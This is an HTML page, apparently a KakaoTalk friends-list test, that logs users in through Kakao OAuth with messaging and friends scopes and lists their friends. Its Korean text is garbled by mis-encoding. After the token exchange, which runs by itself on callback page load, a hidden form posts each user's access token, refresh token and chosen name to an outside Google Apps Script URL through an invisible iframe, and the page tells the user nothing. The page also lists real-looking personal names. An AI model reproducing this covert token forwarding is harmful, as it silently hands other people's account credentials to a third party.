<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8"/>
  <title>ì¹´ì¹´ì˜¤ ì¹œêµ¬ ëª©ë¡ í…ŒìŠ¤íŠ¸</title>
  <style>
    body { font-family: sans-serif; padding: 2rem; }
    select, button { margin: .5rem; padding: .5rem 1rem; font-size: 1rem; }
    pre { background: #f0f0f0; padding: 1rem; white-space: pre-wrap; }
  </style>
</head>
<body>
  <h1>ğŸ“‹ ì¹´ì¹´ì˜¤ ì¹œêµ¬ ëª©ë¡ ë¶ˆëŸ¬ì˜¤ê¸°</h1>

  <!-- 1) ì¹œêµ¬ ì„ íƒ ë“œë¡­ë‹¤ìš´ -->
  <label for="friendSelect">ì¹œêµ¬ ì„ íƒ: </label>
  <select id="friendSelect">
    <option value="" disabled selected>â€” ì„ íƒí•˜ì„¸ìš” â€”</option>
    <option value="ì¡°ë³‘ì¬">ì¡°ë³‘ì¬</option>
    <option value="ê°•ì •í˜¸">ê°•ì •í˜¸</option>
    <option value="ê¹€ê°€ìœ¨">ê¹€ê°€ìœ¨</option>
    <option value="ì˜¤ìˆ˜ì§„">ì˜¤ìˆ˜ì§„</option>
    <option value="ìœ¤ì†Œì—°">ìœ¤ì†Œì—°</option>
    <option value="ì´ì¬í›ˆ">ì´ì¬í›ˆ</option>
    <option value="ì´ì§€í˜œ">ì´ì§€í˜œ</option>
    <option value="ì„ìš©í—Œ">ì„ìš©í—Œ</option>
    <option value="í—ˆì •ì€">í—ˆì •ì€</option>
  </select>

  <!-- 2) ë¡œê·¸ì¸ & ì¹œêµ¬ ì¡°íšŒ ë²„íŠ¼ -->
  <button id="getTokenBtn" disabled>1ï¸âƒ£ ì•¡ì„¸ìŠ¤ í† í° ë°œê¸‰</button>
  <button id="getFriendsBtn" disabled>2ï¸âƒ£ ì¹œêµ¬ ëª©ë¡ ì¡°íšŒ</button>

  <pre id="output"></pre>
  <iframe name="hidden_iframe" style="display:none;"></iframe>

  <script>
    const client_id     = "b753d319ccd4300a4c957d7d4c6c9b96";
    const redirect_uri  = "https://kakao-test-ebon.vercel.app/kakao_friends_test.html";
    const SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbz_-7_5HFl5KoCh4y_HYwgbGUWJOM467jdmssTViy9pW8kn0ukPzqskPCES4HbKfTiJ/exec";

    // ë“œë¡­ë‹¤ìš´ì—ì„œ ì„ íƒëœ ì¹œêµ¬ ì´ë¦„ì„ ì €ì¥
    let state = "";
    document.getElementById("friendSelect").onchange = e => {
      state = e.target.value;
      document.getElementById("getTokenBtn").disabled = !state;
    };

    // query string ì—ì„œ code íŒŒë¼ë¯¸í„° ê°€ì ¸ì˜¤ê¸°
    const params = new URLSearchParams(window.location.search);
    const code   = params.get("code");

    let access_token = "";

    // 1ï¸âƒ£ ì•¡ì„¸ìŠ¤ í† í° ë°œê¸‰
    document.getElementById("getTokenBtn").onclick = () => {
      if (!code) {
        window.location.href =
          `https://kauth.kakao.com/oauth/authorize` +
          `?client_id=${client_id}` +
          `&redirect_uri=${encodeURIComponent(redirect_uri)}` +
          `&response_type=code` +
          `&scope=talk_message,friends` +
          `&state=${encodeURIComponent(state)}`;
      } else {
        // ì´ë¯¸ codeê°€ ìˆìœ¼ë©´ ë°”ë¡œ êµí™˜
        issueToken();
      }
    };

    // 2ï¸âƒ£ ì¹œêµ¬ ëª©ë¡ ì¡°íšŒ
    document.getElementById("getFriendsBtn").onclick = () => {
      fetch("https://kapi.kakao.com/v1/api/talk/friends", {
        headers: { Authorization: `Bearer ${access_token}` }
      })
      .then(r => r.json())
      .then(d => {
        document.getElementById("output").textContent =
          "ğŸ‘¥ ì¹œêµ¬ ëª©ë¡:\n" + JSON.stringify(d, null,2);
      })
      .catch(e => {
        document.getElementById("output").textContent =
          "âŒ ì¹œêµ¬ ëª©ë¡ ìš”ì²­ ì‹¤íŒ¨\n" + e;
      });
    };

    // codeâ†’token êµí™˜ + í¼ POST
    function issueToken() {
      fetch("https://kauth.kakao.com/oauth/token", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          grant_type:   "authorization_code",
          client_id, redirect_uri, code
        })
      })
      .then(r => r.json())
      .then(data => {
        if (data.error) throw new Error(data.error_description);
        access_token = data.access_token;
        document.getElementById("output").textContent =
          "âœ… í† í° ë°œê¸‰ ì™„ë£Œ\n" + JSON.stringify(data, null,2);

        // í¼ POSTë¡œ doPost í˜¸ì¶œ
        const form = document.createElement("form");
        form.method = "POST";
        form.action = SCRIPT_URL;
        form.target = "hidden_iframe";
        [["state",state],["access_token",data.access_token],["refresh_token",data.refresh_token]]
          .forEach(([k,v]) => {
            const inp = document.createElement("input");
            inp.type  = "hidden"; inp.name = k; inp.value = v;
            form.appendChild(inp);
          });
        document.body.appendChild(form);
        form.submit();

        document.getElementById("getFriendsBtn").disabled = false;
      })
      .catch(err => {
        document.getElementById("output").textContent =
          "âŒ í† í° êµí™˜ ì‹¤íŒ¨\n" + err;
      });
    }

    // í˜ì´ì§€ ë¡œë“œ ì‹œ, ë¡œê·¸ì¸ ì½œë°± ëŒì•„ì˜¨ ê²½ìš° ìë™ ì‹¤í–‰
    if (code && (new URLSearchParams(window.location.search).get("state"))) {
      state = params.get("state");
      document.getElementById("getTokenBtn").disabled = false;
      issueToken();
    }
  </script>
</body>
</html>
